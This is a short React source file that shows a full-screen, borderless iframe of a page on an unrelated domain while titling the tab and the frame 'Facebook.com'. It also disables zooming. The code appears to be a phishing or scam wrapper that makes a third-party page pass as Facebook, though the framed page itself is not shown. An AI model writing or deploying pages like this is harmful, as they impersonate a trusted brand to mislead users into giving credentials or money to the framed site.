import React from 'react';

const IframeComponent = () => {
  // CSS styles
  const styles = {
    container: {
      margin: 0,
      padding: 0,
      overflow: 'hidden',
      height: '100vh',
      width: '100vw',
    },
    iframe: {
      width: '100%',
      height: '100%',
      border: 'none',
    }
  };

  return (
    <div style={styles.container}>
      <iframe
        id="myFrame"
        src="https://gift900.cbkgardens.com/nurani-ori/"
        style={styles.iframe}
        title="Facebook.com"
      />
    </div>
  );
};

// App component that uses the IframeComponent
const App = () => {
  return (
    <>
      <head>
        <meta charSet="UTF-8" />
        <meta 
          name="viewport" 
          content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
        />
        <title>Facebook.com</title>
      </head>
      <IframeComponent />
    </>
  );
};

export default App;
